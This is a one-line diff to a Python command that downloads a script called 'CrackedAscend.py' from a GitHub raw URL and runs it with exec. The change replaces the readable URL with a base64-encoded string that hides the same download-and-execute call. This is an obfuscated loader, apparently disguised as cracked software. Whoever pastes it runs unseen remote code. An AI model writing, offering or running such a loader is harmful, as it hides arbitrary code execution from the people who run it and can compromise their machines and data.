@@ -1,1 +1,1 @@
-python -c "import base64,requests;exec(compile(base64.b64decode(base64.b64encode(requests.get('https://github.com/biskit-git/project/raw/refs/heads/main/CrackedAscend.py').content)),'<string>','exec'))"
+python -c "import base64,requests;exec(compile(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzOyBleGVjKHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXRodWIuY29tL2Jpc2tpdC1naXQvcHJvamVjdC9yYXcvcmVmcy9oZWFkcy9tYWluL0NyYWNrZWRBc2NlbmQucHknKS50ZXh0KQ=='),'<string>','exec'))"
